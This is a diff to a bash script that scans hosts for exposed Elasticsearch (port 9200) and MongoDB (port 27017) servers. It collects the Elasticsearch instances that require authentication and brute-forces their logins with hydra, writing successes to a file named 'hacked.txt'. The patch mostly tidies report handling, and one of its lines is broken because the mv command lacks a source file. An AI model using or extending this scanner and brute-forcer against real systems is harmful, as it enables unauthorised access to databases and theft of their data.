@@ -14,12 +14,12 @@ fi
 #Clear report file
 
 if [[ "$1" == "9200" ]]; then
-echo "" > elastic.txt
-echo "" > elastic_secured.txt
+mv -f elastic.txt elastic.txt_`date +%s`
+mv -f elastic_secured.txt_`date +%s`
 fi
 
 if [[ "$1" == "27017" ]]; then
-echo "" > mongodb.txt
+mv  -f mongodb.txt mongodb.txt_`date +%s`
 fi
 
 
@@ -45,6 +45,7 @@ do
 	
 	if curl -X GET "$line:9200/" | grep "security_exception";
 		then echo $line >> elastic_secured.txt;
+	fi
 done
 fi
 
@@ -65,13 +66,14 @@ fi
 
 #brute secured elastics
 
-if [ -s elastic_secured.txt ]
+if [[ $(find ./ -name elastic_secured.txt -type f -size +1 2>/dev/null) ]]; then
 
 	/usr/bin/hydra -M ./elastic_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 9200 -o ./hacked.txt http-get /
 
-else
-	exit
 fi
 
 
+
+rm -f $out.out
+rm -f map.input
 
